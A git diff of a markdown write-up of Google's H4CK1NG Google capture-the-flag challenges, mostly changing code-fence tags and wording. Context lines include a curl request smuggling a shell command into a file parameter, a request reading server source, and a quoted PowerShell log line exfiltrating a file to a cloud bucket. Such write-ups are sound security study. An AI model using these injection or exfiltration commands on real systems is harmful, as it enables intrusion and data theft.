@@ -255,6 +255,7 @@ That would be particularly ‘handy’ as that function can actually [execute pr
 ❯ time curl -G 'https://aurora-web.h4ck.ctfcompetition.com/' \
     --data-urlencode 'file=hexdump.txt;sleep 3|' \
     --data-urlencode 'term=auro'
+
 curl -G 'https://aurora-web.h4ck.ctfcompetition.com/' --data-urlencode     0.01s user 0.01s system 0% cpu 3.357 total
 ```
 
@@ -396,7 +397,7 @@ INFO: Analyze all functions arguments/locals
 
 Oh, wow. In retrospective, probably a carefully crafted  `string/grep` on `./wannacry` would suffice... Anyway, we have a lead:
 
-```shell
+```text
 0x005094aa "Keys are here:.https://wannacry-keys-***REDACTED***/.<blah blah>
 ```
 
@@ -427,7 +428,7 @@ Even if the challenge was solved, I went on analysing the program, since this ca
 
 Apparently, the program voluntarily gives you the above URL if that function returns `true` (i.e., non-zero in C):
 
-```shell
+```asm
 [0x00462ae0]> pdf @sym.main.main
 [...]
 │      │╎   0x00509498      e883ffffff     call sym.main.impossible
@@ -462,7 +463,7 @@ This information has not been useful in this occasion but, as it turned out, it 
 
 Again, we are given a file, named `wannacry`. This time, we have a dynamically-linked executable.
 
-```shell
+```text
 wannacry: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c23340ab6c6d0c158f0ee356a1deb0253d8cf4c, for GNU/Linux 3.2.0, not stripped
 ```
 
@@ -470,7 +471,7 @@ wannacry: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically l
 
 Let’s fire up Radare 2 and analyse the binary:
 
-```shell
+```asm
 ❯ r2 ./wannacry
 Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
  -- Find wide-char strings with the '/w <string>' command
@@ -523,7 +524,7 @@ INFO: Analyze all functions arguments/locals
 
 Mmmh, it looks like our main function just returns. But, again, we have some interesting functions in the binary:
 
-```shell
+```asm
 [0x0002f0b0]> axt @ sym.correct_code
 sym.print 0x2f824 [CALL:--x] call sym.correct_code
 [0x0002f0b0]> pdf @ sym.print
@@ -564,7 +565,7 @@ Note that this challenge is clearly inspired to the real WannaCry story, and [it
 
 Anyway, let's get back to work:
 
-```shell
+```asm
 [0x0002f0b0]> ps @ 0x3f2c8
 https://wannacry-killswitch-dot-**REDACTED**//
 ```
@@ -580,9 +581,9 @@ Oh, noes!!!
 
 BUT! As we can see in the code, the output of `sym.correct_code` (presumably a pointer) is put in `[var_8h]`, which seems to be later used by `write()` to add a suffix to our kill-switch URL.
 
-I will spare you from the analysis of the program, just mentioning that the disasm of `sym.correct_code` contains a reference to `obj.wordlist`. Which immediately sounded promising!
+I will spare you from the analysis of the code, just mentioning that the disasm of `sym.correct_code` contains a reference to `obj.wordlist`. A word is picked from this list and appended to the above URL.
 
-```shell
+```text
 [0x5601d49e2876]> px @ [obj.wordlist]
 - offset -       8 9  A B  C D  E F 1011 1213 1415 1617  89ABCDEF01234567
 0x5601d49e3008  6162 6163 7573 0061 6264 6f6d 656e 0061  abacus.abdomen.a
@@ -634,7 +635,7 @@ for ar in async_results:
 
 The server-side code probably shares client’s logic, as the “right” code changes in time. Thus, the script might fail if the flag changes while it’s running.
 
-```python
+```html
 ❯ ./ep001ch02.py
 
 <html>
@@ -685,13 +686,13 @@ unsupported board
 
 Getting back to the game, I noticed that the first time you click on one of your pieces, the browser will load the page passing the clicked coordinates. For instance:
 
-```shell
+```text
 https://hackerchess2-web.h4ck.ctfcompetition.com/index.php?move_start=e2
 ```
 
-The game now shows the next possible moves. When one of those is clicked, the browser loads a page with a base64 encoded `move_end` parameter. For instance:
+The game now shows the next possible moves. When is clicked, the browser loads a page with a base64 encoded `move_end` parameter. For instance:
 
-```shell
+```text
 https://hackerchess2-web.h4ck.ctfcompetition.com/?move_end=YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30=
 ```
 
@@ -706,7 +707,7 @@ At first, I couldn’t see anything interesting here, and I was a bit lost.
 
 Then I remembered that I had full access to the source code in EP000CH01. Since this version of the game is just a patched version of that one, I downloaded its source:
 
-```shell
+```php
 ❯ curl -s 'http://hackerchess-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
     --data 'filename=./index.php' --output -
 Loading Fen: <?php
@@ -793,7 +794,7 @@ public function __wakeup()
 }
 ```
 
-Note: it’s unlikely that IRL you will find something like this, an exploit served on a silver plate. Nevertheless, PHP deserialization can lead to [real life vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) (edit: have you heard about CVE-2022-22241?)
+Note: it’s unlikely that IRL you will find something like this, an exploit served on a silver plate. Nevertheless, PHP deserialization can lead to [real life vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) (edit: have you heard about [CVE-2022-22241](https://nvd.nist.gov/vuln/detail/CVE-2022-22241)?)
 
 OK, we have everything we need. Let’s write the exploit.
 
@@ -831,13 +832,13 @@ And run it!
 
 And our flag is right there 😊
 
-```shell
+```text
 https://h4ck1ng.google/solve/**REDACTED**
 ```
 
 ## EP002 - Detection and Response
 
-Unfortunately, vigilance is not always enough. So, a company should have detection and response measure in place, to be ready to face cyber-fires.
+Vigilance alone is not always enough. So, a company should have detection and response measure in place, to be ready to face cyber-fires.
 
 ### CHALLENGE 01
 
@@ -853,9 +854,9 @@ I was pretty confident that this was all about [steganography](https://en.wikipe
 
 #### Solution
 
-To analyse the image, I used [Aperisolve](https://www.aperisolve.com). This didn't solve the puzzle, but in the Zsteg box, I saw something interesting:
+To analyse the image I used [Aperisolve](https://www.aperisolve.com). This didn't solve the puzzle, but in the Zsteg box I saw something interesting:
 
-```shell
+```text
 imagedata .. file: Apple DiskCopy 4.2 image , 16777472 bytes, 0x1 tag size, GCR CLV dsdd (800k), 0x0 format
 b1,r,msb,xy .. file: GeoSwath RDF
 b1,a,lsb,xy .. text: "tdbrbtrbrq"
@@ -869,7 +870,7 @@ This is of course a huge hint :)
 
 I started playing with zsteg, and in a couple of minutes I managed to decode the (self-signed) x509 cert…
 
-```shell
+```text
 ❯ zsteg ./challenge.png -E b1,rgba,lsb,xy -l 1244 | dd skip=1 bs=3 | openssl x509 -text -inform pem
 Certificate:
     Data:
@@ -899,7 +900,7 @@ The readme suggests using Timesketch to do some forensic.
 
 The readme also contains a storyline:
 
-```shell
+```text
 Storyline:
 Detectorsprotectors.biz is a cybersecurity company who is heavily invested in building software protections that protects flux capacitors on fire protection hardware.
 
@@ -922,7 +923,7 @@ I created a new investigation, uploaded the CSV file, and began to explore the d
 
 We know the attacker used PowerShell and a RAT (Remote Access Trojan), so I searched for PowerShell usage, getting more than 4.5k results. The last match (i.e., sorting by time, descending), contained the [defanged](https://isc.sans.edu/forums/diary/Defang+all+the+things/22744/), flag!
 
-```shell
+```text
 PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName="exfil-xbhqwf-$($SourceFile.name)";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/**REDACTED**
 }/$RemoteName;
 ```
@@ -1088,7 +1089,7 @@ uid=1000(developer) gid=1000(developer) groups=1000(developer)
 
 There is no flag on this machine, but we can find an interesting `todo.txt` in `developer`’s directory:
 
-```shell
+```text
 developer@googlequanta.com:/home/developer$ cat todo.txt
 Today
 [x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc
@@ -1293,7 +1294,7 @@ Note: I later discovered that there is an [online demo here](https://mobsf.live)
 
 I upload the apk to MobSF. It did an outstanding job and immediately highlighted some potential hardcoded secrets :)
 
-```shell
+```text
 POSSIBLE HARDCODED SECRETS
 
 "hmac_shared_secret" : "uBvB5rPgH0U+yPhzPq9y2i4f1396t/2dCpo3gd7l1+0="
@@ -1430,7 +1431,7 @@ print(r.text)
 
 And got the flag!
 
-```java
+```shell
 ❯ ./exploit.py
 {"subscriberOnly":true,"text":"Secret message","title":"Secret flag data","url":"https://h4ck1ng.google/solve/**REDACTED**"}
 ```
@@ -1451,7 +1452,7 @@ The first thing I did is explore the site. As suggested, some pages are differen
 
 One in particular, the FAQ page, has links to the endpoints mentioned in the challenge description:
 
-```java
+```text
 Q: Why did my attachment fail to upload?
 
 A: To debug, you should call the /import endpoint manually and look at the detailed error message in the response. The same applies to the /export endpoint for downloading attachments from a submission.
@@ -1720,7 +1721,7 @@ sys.exit(1)
 
 And we can get our flag:
 
-```python
+```shell
 ❯ ./exploit.py
 using password '**REDACTED**' (hash: b'zNjBWTgIHKVvhWRBUSKrADRwqDM=')
 .........
@@ -1743,7 +1744,7 @@ Unfortunately, we cannot access that page on the online instance, as we can’t 
 
 In the `contributing` view, we found the following message:
 
-```python
+```shell
 [...]
 First, clone the Git repo for this project:
 
@@ -2255,7 +2256,7 @@ print(r.text)
 
 And got the (super rewarding) flag!
 
-```python
+```shell
 ❯ ./exploit.py
 -m' prefix----
 0001ffffffffffffffff003081f23081cd060960864801650304020105000481bd888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
@@ -2285,34 +2286,34 @@ When I finally heard it, I downloaded each episode’s audio tract, and with FFm
 I could find the approximate frequency, after few iterations, thanks to this website: [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
 
 ```shell
-EP000
+# EP000
 
-ffmpeg -i ep000.mp3 -ss 00:02:50 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep000.mp3 -ss 00:02:50 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep000b.mp3
 
-EP001
+# EP001
 
-ffmpeg -i ep001.mp3 -ss 00:02:17 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep001.mp3 -ss 00:02:17 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep001b.mp3
 
-EP002
+# EP002
 
-ffmpeg -i ep002.mp3 -ss 00:01:30 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep002.mp3 -ss 00:01:30 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep002b.mp3  
 
-EP003
+# EP003
 
-ffmpeg -i ep003.mp3 -ss 00:02:13 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep003.mp3 -ss 00:02:13 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep003b.mp3
 
-EP004
+# EP004
 
-ffmpeg -i ep004.mp3 -ss 00:03:20 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep004.mp3 -ss 00:03:20 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep004b.mp3
 
-EP005
+# EP005
 
-ffmpeg -i ep005.mp3 -ss 00:02:24 -t 00:00:6 -acodec mp3 \
+❯ ffmpeg -i ep005.mp3 -ss 00:02:24 -t 00:00:6 -acodec mp3 \
     -filter:a "highpass=f=4000, lowpass=f=6000" ep005b.mp3
 ```
 
